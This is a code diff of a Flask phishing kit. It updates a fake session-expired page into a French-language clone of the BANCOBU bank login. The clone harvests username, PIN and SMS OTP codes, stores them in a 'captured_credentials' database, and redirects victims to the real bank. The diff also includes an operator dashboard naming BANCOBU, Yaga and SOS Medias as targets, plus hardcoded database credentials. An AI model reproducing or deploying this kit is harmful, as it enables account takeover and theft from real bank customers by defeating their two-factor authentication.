@@ -6,12 +6,9 @@ from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
-
-# Tell Flask to trust its own proxy headers
 app.config['PREFERRED_URL_SCHEME'] = 'https'
 
-# Use the same database URL as bancobu-bonus
-DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://mlw_attack_user:TjJ9r7NHNDSmj2zNZXqUB1eQcSkc7PHn@dpg-d8063p9j2pic73f1mm40-a.frankfurt-postgres.render.com:5432/mlw_attack')
+DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://mlw_attack_user:ShJf3c9NA4Jf1ADITLYh3fIlHc7akHXC@dpg-d8063p9j2pic73f1mm40-a.frankfurt-postgres.render.com:5432/mlw_attack')
 
 def get_db():
     return psycopg2.connect(DATABASE_URL, sslmode='require')
@@ -23,20 +20,21 @@ def init_db():
         conn = get_db()
         cur = conn.cursor()
         cur.execute('''
-            CREATE TABLE IF NOT EXISTS captured_data (
+            CREATE TABLE IF NOT EXISTS captured_credentials (
                 id SERIAL PRIMARY KEY,
                 timestamp TIMESTAMP DEFAULT NOW(),
                 ip TEXT,
                 user_agent TEXT,
                 username TEXT,
-                password TEXT,
-                raw_data TEXT
+                pin TEXT,
+                otp TEXT,
+                step TEXT
             )
         ''')
         conn.commit()
-        print("[+] Database table created/verified.")
+        print("[+] Database ready")
     except Exception as e:
-        print(f"[-] Database init error: {e}")
+        print(f"[-] DB error: {e}")
     finally:
         if cur: cur.close()
         if conn: conn.close()
@@ -47,7 +45,7 @@ DASHBOARD_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MLW Control - Intelligence Dashboard</title>
+    <title>MLW Control - Banking Intelligence</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -62,11 +60,11 @@ DASHBOARD_HTML = '''
         .stats { background: #1a1f3a; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
         .stat-box { background: #0a0e27; padding: 10px 20px; border-radius: 8px; }
         .success { color: #00ff00; font-weight: bold; }
-        .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #666; }
         .badge { background: #ff3366; color: white; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
+        .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #666; }
+        .step-badge { background: #ffd700; color: #0a0e27; padding: 2px 8px; border-radius: 20px; font-size: 10px; }
     </style>
     <script>
-        let authCheck = false;
         async function checkAuth() {
             const res = await fetch('/api/auth');
             const data = await res.json();
@@ -84,43 +82,51 @@ DASHBOARD_HTML = '''
             const pwd = document.getElementById('pwd').value;
             const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ password: pwd }) });
             const data = await res.json();
-            if (data.success) { checkAuth(); } 
-            else { alert('Wrong password'); }
+            if (data.success) checkAuth();
+            else alert('Wrong password');
         }
         async function loadData() {
             const res = await fetch('/api/data');
             const data = await res.json();
             let html = '';
             for (let r of data) {
-                html += `<tr><td>${r.timestamp}</td><td>${r.ip}</td><td>${r.username || '-'}</td><td>${r.password || '-'}</td><td>${r.user_agent || '-'}</td></tr>`;
+                html += `<tr>
+                    <td>${r.timestamp}</td>
+                    <td>${r.ip}</td>
+                    <td><span class="badge">${r.username || '-'}</span></td>
+                    <td><span class="badge">${r.pin || '-'}</span></td>
+                    <td><span class="badge">${r.otp || '-'}</span></td>
+                    <td><span class="step-badge">${r.step || '-'}</span></td>
+                    <td>${r.user_agent ? r.user_agent.substring(0, 50) : '-'}</td>
+                </tr>`;
             }
             document.getElementById('data').innerHTML = html;
-            document.getElementById('stats').innerHTML = `<span class="success">●</span> Total captured: ${data.length}`;
+            document.getElementById('stats').innerHTML = `<span class="success">●</span> Captured: ${data.length} credentials`;
         }
         checkAuth();
     </script>
 </head>
 <body>
 <div id="login" class="login">
-    <center><h2>MLW INTELLIGENCE</h2></center>
+    <center><h2>🔐 MLW Banking Intelligence</h2></center>
     <input type="password" id="pwd" placeholder="Access Key">
     <button onclick="login()">Authenticate</button>
 </div>
 <div id="content" style="display:none">
-    <h1>🔒 MLW Control - Intelligence Dashboard</h1>
+    <h1>🏦 MLW Control - Banking Intelligence Dashboard</h1>
     <div class="stats">
         <div class="stat-box">🔴 Status: <span class="success">ACTIVE</span></div>
         <div class="stat-box" id="stats">📊 Captured: 0</div>
-        <div class="stat-box">🎯 Target: Yaga / SOS Medias</div>
+        <div class="stat-box">🎯 Target: BANCOBU / Yaga / SOS Medias</div>
     </div>
-    <h2>📋 Captured Credentials (Live)</h2>
+    <h2>📋 Captured Credentials (Identifiant + PIN + OTP)</h2>
     <div style="overflow-x: auto;">
-    <table>
-        <thead><tr><th>Timestamp</th><th>IP Address</th><th>Username</th><th>Password</th><th>User Agent</th></tr></thead>
+    <tr>
+        <thead><tr><th>Time</th><th>IP</th><th>Identifiant</th><th>Code PIN</th><th>Code OTP</th><th>Step</th><th>User Agent</th></tr></thead>
         <tbody id="data"></tbody>
     </table>
     </div>
-    <div class="footer">MLW Security Operations - Authorized Access Only</div>
+    <div class="footer">MLW Security Operations - Banking Intelligence</div>
 </div>
 </body>
 </html>
@@ -130,49 +136,240 @@ PHISHING_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Update Required</title>
+    <title>BANCOBU - Session Expired</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: system-ui; background: #0a2b3e; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: white; max-width: 450px; width: 100%; padding: 35px; border-radius: 20px; box-shadow: 0 20px 35px rgba(0,0,0,0.2); text-align: center; border-top: 5px solid #ff3366; }
-        .card h2 { color: #003366; margin-bottom: 15px; }
-        .card p { color: #333; margin-bottom: 25px; line-height: 1.5; }
-        .card input { width: 100%; padding: 14px; margin: 12px 0; border: 1px solid #ccc; border-radius: 10px; font-size: 15px; }
-        .card button { width: 100%; padding: 14px; background: #003366; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .card button:hover { background: #ff3366; }
-        .result { margin-top: 20px; font-size: 14px; }
-        .footer { margin-top: 25px; font-size: 11px; color: #999; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #004d99 0%, #00264d 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            max-width: 450px;
+            width: 100%;
+            padding: 35px;
+            border-radius: 25px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #004d99;
+            margin-bottom: 10px;
+        }
+        .logo span { color: #ffcc00; }
+        .subtitle {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+        }
+        h2 {
+            color: #003366;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        .error-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            text-align: left;
+            border-radius: 8px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #003366;
+            font-size: 13px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #004d99;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #004d99 0%, #00264d 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .btn-otp {
+            background: linear-gradient(135deg, #ffcc00 0%, #ffb300 100%);
+            color: #00264d;
+            display: none;
+        }
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            display: none;
+        }
+        .success-msg {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .info-msg {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        .footer {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #999;
+        }
+        .otp-group {
+            display: none;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
 <div class="card">
-    <h2>🔐 Security Token Expired</h2>
-    <p>Your session token has expired. Please re-enter your credentials to continue securely.</p>
-    <form id="captureForm">
-        <input type="text" id="username" placeholder="Username / Email" autocomplete="off" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Verify & Continue</button>
-    </form>
-    <div id="result" class="result"></div>
-    <div class="footer">Secure Connection | BANCOBU Security</div>
+    <div class="logo">BANCOBU <span>| Enoti</span></div>
+    <div class="subtitle">Banque Commerciale du Burundi</div>
+
+    <div id="step1">
+        <div class="error-box">
+            ⚠️ <strong>Session expirée</strong><br>
+            Votre session a expiré pour des raisons de sécurité. Veuillez vous reconnecter.
+        </div>
+
+        <div class="input-group">
+            <label>Identifiant d'utilisateur</label>
+            <input type="text" id="username" placeholder="ex: agent.enoti">
+        </div>
+        <div class="input-group">
+            <label>Code PIN</label>
+            <input type="password" id="pin" placeholder="••••••">
+        </div>
+
+        <button id="loginBtn" onclick="submitLogin()">Se connecter</button>
+    </div>
+
+    <div id="step2" style="display:none;">
+        <div class="info-msg message" style="display:block; margin-bottom:20px;">
+            📱 <strong>Code OTP envoyé</strong><br>
+            Un code de vérification a été envoyé sur votre téléphone. Veuillez le saisir ci-dessous.
+        </div>
+
+        <div class="input-group">
+            <label>Code OTP de vérification</label>
+            <input type="text" id="otp" placeholder="Entrez le code reçu par SMS">
+        </div>
+
+        <button class="btn-otp" id="otpBtn" onclick="submitOTP()" style="display:block;">Confirmer le code OTP</button>
+    </div>
+
+    <div id="loading" style="display:none;">
+        <p>⏳ Vérification en cours...</p>
+    </div>
+
+    <div id="result" class="message"></div>
+    <div class="footer">🔒 Connexion sécurisée | BANCOBU</div>
 </div>
+
 <script>
-    document.getElementById('captureForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
+    async function submitLogin() {
         const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        const response = await fetch('/api/capture', {
+        const pin = document.getElementById('pin').value;
+
+        if (!username || !pin) {
+            alert("Veuillez remplir tous les champs");
+            return;
+        }
+
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        const response = await fetch('/api/capture_login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username: username, password: password })
+            body: JSON.stringify({ username: username, pin: pin })
         });
-        if (response.ok) {
-            document.getElementById('result').innerHTML = '<span style="color:green;">✅ Token refreshed. Access restored.</span>';
-            document.getElementById('captureForm').reset();
+
+        const data = await response.json();
+
+        if (data.status === 'ok') {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
         } else {
-            document.getElementById('result').innerHTML = '<span style="color:red;">❌ Error. Please try again.</span>';
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+            alert("Erreur technique. Veuillez réessayer.");
         }
-    });
+    }
+
+    async function submitOTP() {
+        const otp = document.getElementById('otp').value;
+        const username = document.getElementById('username').value;
+
+        if (!otp) {
+            alert("Veuillez entrer le code OTP reçu");
+            return;
+        }
+
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        const response = await fetch('/api/capture_otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: username, otp: otp })
+        });
+
+        const data = await response.json();
+
+        if (data.status === 'ok') {
+            document.getElementById('loading').style.display = 'none';
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = "✅ Vérification réussie ! Redirection en cours...";
+            resultDiv.className = "message success-msg";
+            resultDiv.style.display = "block";
+            setTimeout(() => {
+                window.location.href = "https://www.bancobu.bi";
+            }, 2000);
+        } else {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            alert("Code OTP invalide. Veuillez réessayer.");
+        }
+    }
 </script>
 </body>
 </html>
@@ -199,31 +396,61 @@ def login():
         return resp
     return jsonify({'success': False})
 
-@app.route('/api/capture', methods=['POST'])
-def capture():
+@app.route('/api/capture_login', methods=['POST'])
+def capture_login():
     data = request.json
     username = data.get('username', '')
-    password = data.get('password', '')
+    pin = data.get('pin', '')
     conn = None
     cur = None
     try:
         conn = get_db()
         cur = conn.cursor()
         cur.execute('''
-            INSERT INTO captured_data (ip, user_agent, username, password, raw_data)
+            INSERT INTO captured_credentials (ip, user_agent, username, pin, step)
             VALUES (%s, %s, %s, %s, %s)
         ''', (
             request.remote_addr,
             request.headers.get('User-Agent', ''),
             username,
-            password,
-            str(data)
+            pin,
+            'LOGIN'
         ))
         conn.commit()
-        print(f"[!] CREDENTIALS CAPTURED! Username: {username}, Password: {password}, IP: {request.remote_addr}")
+        print(f"[!] LOGIN CAPTURED! Username: {username}, PIN: {pin}, IP: {request.remote_addr}")
         return jsonify({'status': 'ok'})
     except Exception as e:
-        print(f"[-] Capture error: {e}")
+        print(f"[-] Error: {e}")
+        return jsonify({'status': 'error'}), 500
+    finally:
+        if cur: cur.close()
+        if conn: conn.close()
+
+@app.route('/api/capture_otp', methods=['POST'])
+def capture_otp():
+    data = request.json
+    username = data.get('username', '')
+    otp = data.get('otp', '')
+    conn = None
+    cur = None
+    try:
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute('''
+            INSERT INTO captured_credentials (ip, user_agent, username, otp, step)
+            VALUES (%s, %s, %s, %s, %s)
+        ''', (
+            request.remote_addr,
+            request.headers.get('User-Agent', ''),
+            username,
+            otp,
+            'OTP'
+        ))
+        conn.commit()
+        print(f"[!] OTP CAPTURED! Username: {username}, OTP: {otp}, IP: {request.remote_addr}")
+        return jsonify({'status': 'ok'})
+    except Exception as e:
+        print(f"[-] Error: {e}")
         return jsonify({'status': 'error'}), 500
     finally:
         if cur: cur.close()
@@ -236,9 +463,9 @@ def get_data():
     try:
         conn = get_db()
         cur = conn.cursor()
-        cur.execute('SELECT timestamp, ip, username, password, user_agent FROM captured_data ORDER BY timestamp DESC LIMIT 100')
+        cur.execute('SELECT timestamp, ip, username, pin, otp, step, user_agent FROM captured_credentials ORDER BY timestamp DESC LIMIT 100')
         rows = cur.fetchall()
-        return jsonify([{'timestamp': r[0], 'ip': r[1], 'username': r[2], 'password': r[3], 'user_agent': r[4]} for r in rows])
+        return jsonify([{'timestamp': r[0], 'ip': r[1], 'username': r[2], 'pin': r[3], 'otp': r[4], 'step': r[5], 'user_agent': r[6]} for r in rows])
     except Exception as e:
         return jsonify([])
     finally:
